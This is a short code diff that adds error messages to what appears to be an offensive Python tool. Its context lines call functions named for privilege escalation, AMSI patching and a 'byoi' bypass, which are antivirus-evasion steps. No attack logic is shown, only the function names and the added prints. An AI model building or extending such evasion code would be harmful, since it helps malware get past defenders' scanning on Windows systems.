@@ -499,6 +499,7 @@ def elevate_privileges():
         else:
             pass
     except Exception:
+        print("Failed to elevate privileges.")
         pass
 ############################# Checks execute #############################
 try:
@@ -511,6 +512,7 @@ try:
     patch_amsi_dynamic()   
     byoi_bypass() 
 except Exception as e:
+    print(f"Error during evasion: {e}")
     sys.exit(0)
                             
      """)
